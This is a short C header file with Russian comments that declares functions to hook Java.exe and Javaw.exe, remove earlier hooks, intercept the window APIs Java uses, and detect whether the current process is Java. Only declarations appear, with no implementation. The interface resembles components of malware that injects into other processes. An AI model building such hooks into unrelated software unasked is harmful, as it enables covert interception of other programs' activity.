#ifndef		__java_h__
#define		__java_h__

#include <windows.h>


//*********************************************************************
//  HookJava - функция вешает хуки на Java.exe и Javaw.exe
//  Функция проверяет в каком процессе она запущена, снимает старые 
//  хуки, хуки на нужные api
//*********************************************************************
bool HookJava();

//*********************************************************************
//  HookJavaApi - функция вешает хуки на API,
//  которые использует Java для работы со своими окнами
//*********************************************************************
bool HookJavaApi();

//*********************************************************************
//  IsJava функция возвращает истину если данный процес
//  является процессом Java
//*********************************************************************
bool WINAPI IsJava();

#endif		//__java_h__